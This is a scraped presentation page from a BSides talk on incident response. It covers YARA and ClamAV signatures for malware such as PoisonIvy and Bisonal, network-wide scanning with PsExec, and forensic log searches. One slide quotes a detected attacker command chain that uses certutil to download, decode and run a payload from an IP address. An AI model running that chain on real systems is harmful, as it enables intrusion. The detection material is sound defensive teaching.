strings:
$s00 = &quot;Flag:8080&quot; ascii wide nocase
condition:
all of them and
uint16(0) == 0xC3D4
}
rule campaignB {
strings:
$s00 = &quot;Flag:84d&quot; ascii wide nocase
condition:
all of them and
uint16(0) == 0xC3D4
}
rule campaignC {
strings:
$s00 = &quot;flag:boat&quot; ascii wide nocase
condition:
all of them and
uint16(0) == 0xC3D4
}
rule campaignD {
strings:
$s00 = &quot;Flag:d2&quot; ascii wide nocase
condition:
all of them and
uint16(0) == 0xC3D4
}
rule campaignE {
strings:
$s00 = &quot;Flag:dick&quot; ascii wide nocase
condition:
all of them and
uint16(0) == 0xC3D4
}
rule campaignF {
strings:
$s00 = &quot;flag:ihi&quot; ascii wide nocase
condition:
all of them and
uint16(0) == 0xC3D4
}
rule campaignW {
strings:
$s00 = &quot;Flag:qqq&quot; ascii wide nocase
condition:
all of them and
uint16(0) == 0xC3D4
}
To develop AIOCs from atomic
indicators we need to
incorporate actionable
elements that link the malware
to a specific actor and
campaign...
This Yara can be
applied to PCAPs

 " class="vertical-slide-image VerticalSlideImage_image__VtE4p" data-testid="vertical-slide-image" loading="lazy" srcSet="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-20-320.jpg 320w, https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-20-638.jpg 638w, https://image.slidesharecdn.com/bsidesfinal-180515003159/75/BSides-IR-in-Heterogeneous-Environment-20-2048.jpg 2048w" src="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-20-320.jpg" sizes="100vw"/></div><!--$--><!--/$--></div></div><div><div id="slide21" class="VerticalSlide_root__jU_9r slide-item" style="aspect-ratio:960 / 540" data-cy="slide-container"><div class="VerticalSlideImage_root__64KSA"><img id="slide-image-20" alt="Why ClamAV for AIOCs?
21
 " class="vertical-slide-image VerticalSlideImage_image__VtE4p" data-testid="vertical-slide-image" loading="lazy" srcSet="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-21-320.jpg 320w, https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-21-638.jpg 638w, https://image.slidesharecdn.com/bsidesfinal-180515003159/75/BSides-IR-in-Heterogeneous-Environment-21-2048.jpg 2048w" src="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-21-320.jpg" sizes="100vw"/></div><!--$--><!--/$--></div></div><div><div id="slide22" class="VerticalSlide_root__jU_9r slide-item" style="aspect-ratio:960 / 540" data-cy="slide-container"><div class="VerticalSlideImage_root__64KSA"><img id="slide-image-21" alt="22
Clam AV: Intro
 ClamAV is an open source and free anti-virus program.
 ClamAV runs on Windows (ClamWin), Linux, BSD, Solaris, and Mac OS X, and its
mainly designed to scan email attachment, but it can be used as a regular anti-
virus.
 ClamAV includes:
 Features
 Can search archives
 Can search multiple file types
 Multithreaded
 Clamscan
 Clamdscan/Clamd
 Freshclam
Command line virus scanner
Client/Server virus scanner
tool to update the virus definition database
 " class="vertical-slide-image VerticalSlideImage_image__VtE4p" data-testid="vertical-slide-image" loading="lazy" srcSet="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-22-320.jpg 320w, https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-22-638.jpg 638w, https://image.slidesharecdn.com/bsidesfinal-180515003159/75/BSides-IR-in-Heterogeneous-Environment-22-2048.jpg 2048w" src="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-22-320.jpg" sizes="100vw"/></div><!--$--><!--/$--></div></div><div><div id="slide23" class="VerticalSlide_root__jU_9r slide-item" style="aspect-ratio:960 / 540" data-cy="slide-container"><div class="VerticalSlideImage_root__64KSA"><img id="slide-image-22" alt="23
YARA Rules, AIOCs and ClamAV
 Yara is the swiss army knife for any low-cost triage and can be applied to many
endpoint forensic platforms.
 Values that work across multiple platforms
 Text strings
 Hex values that are in multiple versions of the binary
 ClamAV provides combination of both worlds.
 By empowering ClamAV with Yara rules, we are able to run massive triage on almost all type
of system using AIOCs we have developed.
 " class="vertical-slide-image VerticalSlideImage_image__VtE4p" data-testid="vertical-slide-image" loading="lazy" srcSet="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-23-320.jpg 320w, https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-23-638.jpg 638w, https://image.slidesharecdn.com/bsidesfinal-180515003159/75/BSides-IR-in-Heterogeneous-Environment-23-2048.jpg 2048w" src="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-23-320.jpg" sizes="100vw"/></div><!--$--><!--/$--></div></div><div><div id="slide24" class="VerticalSlide_root__jU_9r slide-item" style="aspect-ratio:960 / 540" data-cy="slide-container"><div class="VerticalSlideImage_root__64KSA"><img id="slide-image-23" alt="Using ClamAV to Scan for Badness
clamscan --infected --recursive --allmatch archive
-verbose --database ./{yara sigs}.yara {starting directory} |
tee clamav_{date}_yara
clamscan --infected --recursive --allmatch --archive-verbose
--database ./{clamav sigs}.ldb {starting directory} | tee
clamav_{date}_sigs
24
 " class="vertical-slide-image VerticalSlideImage_image__VtE4p" data-testid="vertical-slide-image" loading="lazy" srcSet="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-24-320.jpg 320w, https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-24-638.jpg 638w, https://image.slidesharecdn.com/bsidesfinal-180515003159/75/BSides-IR-in-Heterogeneous-Environment-24-2048.jpg 2048w" src="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-24-320.jpg" sizes="100vw"/></div><!--$--><!--/$--></div></div><div><div id="slide25" class="VerticalSlide_root__jU_9r slide-item" style="aspect-ratio:960 / 540" data-cy="slide-container"><div class="VerticalSlideImage_root__64KSA"><img id="slide-image-24" alt="Using ClamAV: Results Custom Rules - ClamAV
 Multiple hits on the same file helps to verify results
/kswapd0: cpuminer_v2.3.3_64bit.UNOFFICIAL FOUND
/kswapd0: cpuminer_generic.UNOFFICIAL FOUND

 " class="vertical-slide-image VerticalSlideImage_image__VtE4p" data-testid="vertical-slide-image" loading="lazy" srcSet="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-25-320.jpg 320w, https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-25-638.jpg 638w, https://image.slidesharecdn.com/bsidesfinal-180515003159/75/BSides-IR-in-Heterogeneous-Environment-25-2048.jpg 2048w" src="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-25-320.jpg" sizes="100vw"/></div><!--$--><!--/$--></div></div><div><div id="slide26" class="VerticalSlide_root__jU_9r slide-item" style="aspect-ratio:960 / 540" data-cy="slide-container"><div class="VerticalSlideImage_root__64KSA"><img id="slide-image-25" alt="Using ClamAV: Results Custom Rules - Yara

26
 " class="vertical-slide-image VerticalSlideImage_image__VtE4p" data-testid="vertical-slide-image" loading="lazy" srcSet="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-26-320.jpg 320w, https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-26-638.jpg 638w, https://image.slidesharecdn.com/bsidesfinal-180515003159/75/BSides-IR-in-Heterogeneous-Environment-26-2048.jpg 2048w" src="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-26-320.jpg" sizes="100vw"/></div><!--$--><!--/$--></div></div><div><div id="slide27" class="VerticalSlide_root__jU_9r slide-item" style="aspect-ratio:960 / 540" data-cy="slide-container"><div class="VerticalSlideImage_root__64KSA"><img id="slide-image-26" alt="Sigtool: ClamAV command line
27
Sigtool
(signature and database
management tool)
Signature using the hash of
the PE-section of an
executable
Signature using full MD5
hash of file
Signature using the a hex
fragment of a file
 " class="vertical-slide-image VerticalSlideImage_image__VtE4p" data-testid="vertical-slide-image" loading="lazy" srcSet="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-27-320.jpg 320w, https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-27-638.jpg 638w, https://image.slidesharecdn.com/bsidesfinal-180515003159/75/BSides-IR-in-Heterogeneous-Environment-27-2048.jpg 2048w" src="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-27-320.jpg" sizes="100vw"/></div><!--$--><!--/$--></div></div><div><div id="slide28" class="VerticalSlide_root__jU_9r slide-item" style="aspect-ratio:960 / 540" data-cy="slide-container"><div class="VerticalSlideImage_root__64KSA"><img id="slide-image-27" alt="C:Documents and SettingsuserDesktop&gt; sigtool --md5 malware.exe &gt;&gt; sigFile.hdb
C:Documents and SettingsuserDesktop&gt;type sigFile.hdb
B4619d8058362b38d20480c14d30c209:40500:malware.exe
C:Documents and SettingsuserDesktop&gt; sigtool --mdb malware.exe.text.dat &gt;&gt;
sigFile.mdb
 To create a unique signature for an executable file we use the --md5 option of
sigtool, and then save the output into a file with a .hdb extension.
 To create a signature that will match a particular PE section (typically the sections are
labelled .text, .rdata, .data, .idata, etc.), use the --mdb option of sigtool and then save
the output into a .mdb file. The easiest way to generate MD5 based section signatures is
to extract target PE sections into separate files.
Sigtool: Command explained
28
 " class="vertical-slide-image VerticalSlideImage_image__VtE4p" data-testid="vertical-slide-image" loading="lazy" srcSet="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-28-320.jpg 320w, https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-28-638.jpg 638w, https://image.slidesharecdn.com/bsidesfinal-180515003159/75/BSides-IR-in-Heterogeneous-Environment-28-2048.jpg 2048w" src="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-28-320.jpg" sizes="100vw"/></div><!--$--><!--/$--></div></div><div><div id="slide29" class="VerticalSlide_root__jU_9r slide-item" style="aspect-ratio:960 / 540" data-cy="slide-container"><div class="VerticalSlideImage_root__64KSA"><img id="slide-image-28" alt="C:Documents and SettingsuserDesktop&gt; echo I am malware | sigtool --hex-dump
4920616d2061206d616c77617265200d0a
C:Documents and SettingsuserDesktop&gt; echo
testSig:0:*:4920616d2061206d616c77617265200d0a &gt;&gt; sigFile.ndb
 The last method is to use Body-based signatures in an hexadecimal format.
It relies on extracted strings from the body of the file.
 In the next example we create an hex dump of the string I am malware.
 Next we save the signature that has the format called Extended Signature:
MalwareName:TargetType:Offset:HexSignature and redirect the
output to a file .ndb.
Sigtool: Command explained
29

 ClamAV Signature Creator (CASC)
 How to use it:
https://github.com/Cisco-Talos/CASC/wiki
Open binary in IDA and select Strings Window
Right click and select add string

 " class="vertical-slide-image VerticalSlideImage_image__VtE4p" data-testid="vertical-slide-image" loading="lazy" srcSet="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-30-320.jpg 320w, https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-30-638.jpg 638w, https://image.slidesharecdn.com/bsidesfinal-180515003159/75/BSides-IR-in-Heterogeneous-Environment-30-2048.jpg 2048w" src="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-30-320.jpg" sizes="100vw"/></div><!--$--><!--/$--></div></div><div><div id="slide31" class="VerticalSlide_root__jU_9r slide-item" style="aspect-ratio:960 / 540" data-cy="slide-container"><div class="VerticalSlideImage_root__64KSA"><img id="slide-image-30" alt="Generating ClamAV Signatures with IDA with CASC
 Select signature(s) and hit Create ClamAV Signature button on the ClamAV Signature Creator view.
 In the popup, find the signature and save to file
Note: Make sure the extension is ldb

31
 " class="vertical-slide-image VerticalSlideImage_image__VtE4p" data-testid="vertical-slide-image" loading="lazy" srcSet="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-31-320.jpg 320w, https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-31-638.jpg 638w, https://image.slidesharecdn.com/bsidesfinal-180515003159/75/BSides-IR-in-Heterogeneous-Environment-31-2048.jpg 2048w" src="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-31-320.jpg" sizes="100vw"/></div><!--$--><!--/$--></div></div><div><div id="slide32" class="VerticalSlide_root__jU_9r slide-item" style="aspect-ratio:960 / 540" data-cy="slide-container"><div class="VerticalSlideImage_root__64KSA"><img id="slide-image-31" alt="Remote ClamAV scan with Psexec
 Psexec can execute remote commands
and so start the scan on every computer
of a network.
 To use Psexec, the user must have rights
to access the filesystem of the target
computer.
&gt; psexec 192.168.81.128 -u administrator -p p4ssw0rd1! &quot;C:Program Files (x86)ClamAV
clamscan&quot; -r -d C:bioazih.ndb C:
&gt; psexec DESTINATIONIP -u USER -p PASSWORD REMOTE_PATH_TO_CLAMSCAN&quot; -r -d
LOCAL_PATH_TO_CLAMAV_DATABASE_FILE REMOTE_PATH_TO_SCAN
Psxec machine
with ClamAV DB
Scanned Host 1
Scanned Host 2
Scanned Host 3
32
 " class="vertical-slide-image VerticalSlideImage_image__VtE4p" data-testid="vertical-slide-image" loading="lazy" srcSet="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-32-320.jpg 320w, https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-32-638.jpg 638w, https://image.slidesharecdn.com/bsidesfinal-180515003159/75/BSides-IR-in-Heterogeneous-Environment-32-2048.jpg 2048w" src="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-32-320.jpg" sizes="100vw"/></div><!--$--><!--/$--></div></div><div><div id="slide33" class="VerticalSlide_root__jU_9r slide-item" style="aspect-ratio:960 / 540" data-cy="slide-container"><div class="VerticalSlideImage_root__64KSA"><img id="slide-image-32" alt="Remote ClamAV scan with FRAC
 FRAC can be used to scan the network.
 It tracks those IP addresses that cannot
be connected so that can be feed back to
FRAC later for scanning.
 Remember to create a share with clam
databases
 Might be able to scan more 25 boxes at a
time. Do sensitive boxes by hand vs using
FRAC.
FRAC machine
with ClamAV DB
Scanned Host 1
Scanned Host 2
Scanned Host 3
./frac_v0.05.pl --iplist iplist.txt --cmd cmd.txt --verbose
33
 " class="vertical-slide-image VerticalSlideImage_image__VtE4p" data-testid="vertical-slide-image" loading="lazy" srcSet="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-33-320.jpg 320w, https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-33-638.jpg 638w, https://image.slidesharecdn.com/bsidesfinal-180515003159/75/BSides-IR-in-Heterogeneous-Environment-33-2048.jpg 2048w" src="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-33-320.jpg" sizes="100vw"/></div><!--$--><!--/$--></div></div><div><div id="slide34" class="VerticalSlide_root__jU_9r slide-item" style="aspect-ratio:960 / 540" data-cy="slide-container"><div class="VerticalSlideImage_root__64KSA"><img id="slide-image-33" alt="ClamAV PoisonIvy variants signature
PoisonIvy2015:0:*:257375706461746525346425303264253032642530326425303264253032642e746d70*434f4e4e4543542025733a256920485454502f2f312e30
PoisonIVY2011:0:*:202f632064656c202573203e206e756c*25752e3139332e25642e2564*47455420257320485454502f312e31*757564646f7362656174
PoisonIVY2011UPX:0:*:76727937666f2f55524c446f776e657a7b*365c5c7525752e3139332e2564
The second part contains instead
CONNECT %s:%i HTTP//1.0
The first Rule contains two non-successive strings divided by the symbol *. The first
string translated from hexadecimal contains the word
%supdate%4d%02d%02d%02d%02d%02d.tmp.
This rule takes a Poison Ivy sample dated 2011 and we use 3 different
strings. The first is /c del %s &gt; nul
The second strings is
GET %s HTTP/1.1
The last matches to
uuddosbea
The third rule is the same sample
mentioned above, but without the
package UPX. The first of two strings
is vry7fo/URLDownez{
The second strings is
6u%u.193.%d
34
 " class="vertical-slide-image VerticalSlideImage_image__VtE4p" data-testid="vertical-slide-image" loading="lazy" srcSet="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-34-320.jpg 320w, https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-34-638.jpg 638w, https://image.slidesharecdn.com/bsidesfinal-180515003159/75/BSides-IR-in-Heterogeneous-Environment-34-2048.jpg 2048w" src="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-34-320.jpg" sizes="100vw"/></div><!--$--><!--/$--></div></div><div><div id="slide35" class="VerticalSlide_root__jU_9r slide-item" style="aspect-ratio:960 / 540" data-cy="slide-container"><div class="VerticalSlideImage_root__64KSA"><img id="slide-image-34" alt="ClamAV Bisonal - logic signature
BISONAL;Target:1;(0&amp;1&amp;2)|(0&amp;2&amp;3)|(4&amp;5)|(6&amp;7&amp;8);534f4654574152455c4d6963726f736f66745c57696e646f77735c43757272656e7456657273696f6e5c52756e;776b6
b6f25303068686831797e7c747d707074317c7072304a6f73707e7b5976737a30797e727a306730702f317e6c6f;633a5c77696e646f77735c7461736b735c646566612e6578
65;6c6f76652061206d656e67;4845404c2d505368656c6c45;7865637574;776b6b6f253030796a717b317c727c31706d31746d304a6f73707e7b5976737a30797e727a306
730702f317e6c6f;687474703a2f2f25732f25732e6173703f69643d257325732573;633a5c615c322e747874
BISONAL;Target:1;(0&amp;1&amp;2)|(0&amp;2&amp;3)|(4&amp;5)|(6&amp;7&amp;8)
This is a ClamAV Body-based, slightly different, from
the previous one. It has to be put inside a .LDB file
and it is possible to use logic operators inside the rule.
Logical operators in action within the BISONAL signature.
Numbers are placeholders for the hex strings.
Match IF found: (both strings 0,1 and 2) OR (both strings
0,2 and 3) OR (only strings 4 and 5) OR (both strings 6,7
and 8).
534f4654574152455c4d6963726f736f66745c57696e646f77735c43757272656e7456657273696f6e5c52756e =
SOFTWAREMicrosoftWindowsCurrentVersionRun
776b6b6f25303068686831797e7c747d707074317c7072304a6f73707e7b5976737a30797e727a306730702f317e6
c6f = wkko%00hhh1y~|t}ppt1|pr0Josp~{Yvsz0y~rz0g0p/1~lo
633a5c77696e646f77735c7461736b735c646566612e657865 = c:windowstasksdfea.exe
6c6f76652061206d656e67 = love a meng
4845404c2d505368656c6c45 = HE@L-PShellE
7865637574 = xecut
776b6b6f253030796a717b317c727c31706d31746d304a6f73707e7b5976737a30797e727a306730702f317e6c6f =
wkko%00yjq{1|r|1pm1tm0Josp~{Yvsz0y~rz0g0p/1~lo
687474703a2f2f25732f25732e6173703f69643d257325732573 = http://%s/%s.asp?id=%s%s%s
633a5c615c322e747874 = c:a2.txtz
1
2
3
4

6
7
8

 " class="vertical-slide-image VerticalSlideImage_image__VtE4p" data-testid="vertical-slide-image" loading="lazy" srcSet="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-35-320.jpg 320w, https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-35-638.jpg 638w, https://image.slidesharecdn.com/bsidesfinal-180515003159/75/BSides-IR-in-Heterogeneous-Environment-35-2048.jpg 2048w" src="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-35-320.jpg" sizes="100vw"/></div><!--$--><!--/$--></div></div><div><div id="slide36" class="VerticalSlide_root__jU_9r slide-item" style="aspect-ratio:960 / 540" data-cy="slide-container"><div class="VerticalSlideImage_root__64KSA"><img id="slide-image-35" alt="ClamAV and Forensics
 ClamAV can help with Forensics investigations
 Can detect badness in log files
 Example Find:
 Find in the section C of the modsec logs:
/var/log/httpd/modsec_audit.log: Win.Downloader.CertutilURLCache-6335697-0 FOUND
certutil -urlcache -split -f http://xx.xx.xx.xx/update.b64 update.b64
certutil -decode update.b64 update.exe
update.exe
36
 " class="vertical-slide-image VerticalSlideImage_image__VtE4p" data-testid="vertical-slide-image" loading="lazy" srcSet="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-36-320.jpg 320w, https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-36-638.jpg 638w, https://image.slidesharecdn.com/bsidesfinal-180515003159/75/BSides-IR-in-Heterogeneous-Environment-36-2048.jpg 2048w" src="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-36-320.jpg" sizes="100vw"/></div><!--$--><!--/$--></div></div><div><div id="slide37" class="VerticalSlide_root__jU_9r slide-item" style="aspect-ratio:960 / 540" data-cy="slide-container"><div class="VerticalSlideImage_root__64KSA"><img id="slide-image-36" alt=" Actionable IOCs is an answer to the need of solid indicators to support the investigation, the
attribution and the triage, of incidents generated by malicious actors.
 The adoption of this methodology can positively impact investigation and triage, but also
improves knowledge of the tools and strategies adopted by the adversaries.
 The formalization process behind it can facilitate the exchange of information and
indicators without the risk of unintentional leakage of sensitive information and, in short,
strengthen the proactive and reactive capabilities of any structure.
Where are we heading
 " class="vertical-slide-image VerticalSlideImage_image__VtE4p" data-testid="vertical-slide-image" loading="lazy" srcSet="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-37-320.jpg 320w, https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-37-638.jpg 638w, https://image.slidesharecdn.com/bsidesfinal-180515003159/75/BSides-IR-in-Heterogeneous-Environment-37-2048.jpg 2048w" src="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-37-320.jpg" sizes="100vw"/></div><!--$--><!--/$--></div></div><div><div id="slide38" class="VerticalSlide_root__jU_9r slide-item" style="aspect-ratio:960 / 540" data-cy="slide-container"><div class="VerticalSlideImage_root__64KSA"><img id="slide-image-37" alt="Thanks!
 " class="vertical-slide-image VerticalSlideImage_image__VtE4p" data-testid="vertical-slide-image" loading="lazy" class="sidebar hide-scrollbar Sidebar_root__1BbNu" style="--slots:13"><div class="above-recs-ad-wrapper AboveRecsAd_root__iTmTR"><div class="AboveRecsAd_desktopAd__ymykj"><div class="freestar-ad-container FreestarAdContainer_root__qPPC_" style="--fallback-aspect-ratio:300 / 260" data-testid="freestar-ad-container"><div><div class="" id="above-recs-desktop-ad-sm"></div></div></div></div></div><!--$--><div class="rail-recs RailRecommendations_root__zqtZQ"><h2 class="RailRecommendations_title__kt1D2">Recommended</h2><div class="RailCard_root__rZUGY RailCard_hasDescription__MjSgf SlideshowCard_root__pD8t4 slideshow-card" aria-describedby="recommended-card-description-0" aria-haspopup="dialog" aria-controls=":Rgql4f6:" popovertarget=":Rgql4f6:" style="anchor-name:--popover-Rgql4f6"><a class="SlideshowCardLink_root__p8KI7" data-cy="slideshow-card-link" data-testid="slideshow-card-link" href="https://www.slideshare.net/slideshow/hitcon-2020-cti-village-threat-hunting-and-campaign-tracking-workshoppptx/240070630"><span class="sr-only">[HITCON 2020 CTI Village] Threat Hunting and Campaign Tracking Workshop.pptx</span></a><div class="slideshow-thumbnail Thumbnail_root__qLW0K SlideshowCard_thumb__86aJk" style="aspect-ratio:1.5;--index:0" data-testid="card-thumbnail"><img class="Thumbnail_thumb__UXO3a Thumbnail_blur__opK6A Thumbnail_cover__1zsIi" alt="[HITCON 2020 CTI Village] Threat Hunting and Campaign Tracking Workshop.pptx" src="https://cdn.slidesharecdn.com/ss_thumbnails/threathuntingtocampaigntrackingworkshop-hitcon2020ctivillage-201213185811-thumbnail.jpg?width=560&amp;fit=bounds" loading="lazy"/><img src="https://cdn.slidesharecdn.com/ss_thumbnails/threathuntingtocampaigntrackingworkshop-hitcon2020ctivillage-201213185811-thumbnail.jpg?width=560&amp;fit=bounds" loading="lazy"/></div><div class="SlideshowCard_content__xh7kV slideshow-card-content"><span class="slideshow-title SlideshowTitle_root__2VccW RailCard_title__Tvfiv ellipsis" style="-webkit-line-clamp:2" data-cy="slideshow-title">[HITCON 2020 CTI Village] Threat Hunting and Campaign Tracking Workshop.pptx</span><button type="button" class="Button_root__i1yp0 Button_secondary__hHiHI Button_text__ZT_3O Button_small__sqsEx Button_icon__1C4qi" data-testid="button" aria-checked="false" aria-label="Save [HITCON 2020 CTI Village] Threat Hunting and Campaign Tracking Workshop.pptx for later" role="switch" aria-haspopup="dialog" aria-controls=":R5mgql4f6:" popovertarget=":R5mgql4f6:" style="anchor-name:--popover-R5mgql4f6"><span class="icon Icon_root__AjZyv RecSaveButton_icon__btwCp" style="--size:24px"><span class="Icon_icon__4zzsG" style="mask-image:url(https://public.slidesharecdn.com/_next/static/media/save.ef1812e2.svg);background-color:currentColor"></span><span class="sr-only"></span></span></button><div class="Tooltip_root__7FS0Y" id=":R5mgql4f6:" popover="manual" data-popover-position="top" style="position-anchor:--popover-R5mgql4f6"></div><a class="SlideshowAuthor_root__IkT1_ RailCard_author__JYeYZ slideshow-author ellipsis" data-testid="slideshow-author" data-cy="slideshow-author" href="https://www.slideshare.net/ChiEnAshleyShen">Chi En (Ashley) Shen</a><div class="slideshow-stats SlideshowStats_root__EQOR1 RailCard_stats__ZvZms"></div><span aria-hidden="true" class="seo-only">Speakers: Ashley Shen, Steve Su
This is a threat hunting and campaign tracking 101 workshop Ashley Shen (Google) and Steve (FireEye) prepared for the HITCON 2020 CTI Village. In this presentation we share the threat hunting concept with some basic techniques and explain the process and guidance for campaign tracking. The presentation was only 65 mins so we couldn&#x27;t covered everything. However through this talk we hope to share our experience and insight to the beginners.  </span></div></div><div class="" id=":Rgql4f6:" popover="manual" data-popover-position="bottom-start" style="position-anchor:--popover-Rgql4f6"></div><div class="separator Separator_root__70Ime Separator_horizontal__czVEa" style="--color:var(--blue-gray-200);--size:1px" role="separator"></div><div class="RailCard_root__rZUGY RailCard_hasDescription__MjSgf SlideshowCard_root__pD8t4 slideshow-card" aria-describedby="recommended-card-description-1" aria-haspopup="dialog" aria-controls=":Rhal4f6:" popovertarget=":Rhal4f6:" style="anchor-name:--popover-Rhal4f6"><a class="SlideshowCardLink_root__p8KI7" data-cy="slideshow-card-link" data-testid="slideshow-card-link" href="https://www.slideshare.net/slideshow/inside-cybercrime-groups-harvesting-active-directory-for-fun-and-profit-vitali-kremez/148833643"><span class="sr-only">Inside Cybercrime Groups Harvesting Active Directory for Fun and Profit - Vit...</span></a><div class="slideshow-thumbnail Thumbnail_root__qLW0K SlideshowCard_thumb__86aJk" style="aspect-ratio:1.5;--index:1" data-testid="card-thumbnail"><img class="Thumbnail_thumb__UXO3a Thumbnail_blur__opK6A Thumbnail_cover__1zsIi" alt="Inside Cybercrime Groups Harvesting Active Directory for Fun and Profit - Vit..." src="https://cdn.slidesharecdn.com/ss_thumbnails/2019-06-01-confidence-vk-main-190604085509-thumbnail.jpg?width=560&amp;fit=bounds" loading="lazy"/><img class="Thumbnail_thumb__UXO3a Thumbnail_contain__K6M0d" alt="Inside Cybercrime Groups Harvesting Active Directory for Fun and Profit - Vit..." src="https://cdn.slidesharecdn.com/ss_thumbnails/2019-06-01-confidence-vk-main-190604085509-thumbnail.jpg?width=560&amp;fit=bounds" loading="lazy"/></div><div class="SlideshowCard_content__xh7kV slideshow-card-content"><span class="slideshow-title SlideshowTitle_root__2VccW RailCard_title__Tvfiv ellipsis" style="-webkit-line-clamp:2" data-cy="slideshow-title">Inside Cybercrime Groups Harvesting Active Directory for Fun and Profit - Vit...</span><button type="button" class="Button_root__i1yp0 Button_secondary__hHiHI Button_text__ZT_3O Button_small__sqsEx Button_icon__1C4qi" data-testid="button" aria-checked="false" aria-label="Save Inside Cybercrime Groups Harvesting Active Directory for Fun and Profit - Vit... for later" role="switch" aria-haspopup="dialog" aria-controls=":R5mhal4f6:" popovertarget=":R5mhal4f6:" style="anchor-name:--popover-R5mhal4f6"><span class="icon Icon_root__AjZyv RecSaveButton_icon__btwCp" style="--size:24px"><span class="Icon_icon__4zzsG" style="mask-image:url(https://public.slidesharecdn.com/_next/static/media/save.ef1812e2.svg);background-color:currentColor"></span><span class="sr-only"></span></span></button><div class="Tooltip_root__7FS0Y" id=":R5mhal4f6:" popover="manual" data-popover-position="top" style="position-anchor:--popover-R5mhal4f6"></div><a class="SlideshowAuthor_root__IkT1_ RailCard_author__JYeYZ slideshow-author ellipsis" data-testid="slideshow-author" data-cy="slideshow-author" href="https://www.slideshare.net/proidea_conferences">PROIDEA</a><div class="slideshow-stats SlideshowStats_root__EQOR1 RailCard_stats__ZvZms"></div><span aria-hidden="true" class="seo-only">Vitali presents malware techniques and tricks on how to reverse engineer and analyze malware families exploiting active directory. The talk dives deeper into pseudo-source code level analysis and malware developer implementation of Lightweight Directory Access Protocol (LDAP) harvesting techniques for lateral movement and persistence across corporate environment. The talks explores three prolific malware families such as TrickBot, QakBot, and IcedID (BokBot) and their coding routine and patterns that are focused on collecting LDAP. For example, TrickBot specifically grabs credential and group policy information stored in SYSVOL das well as searching for corporate machines for possible sensitive machines associated 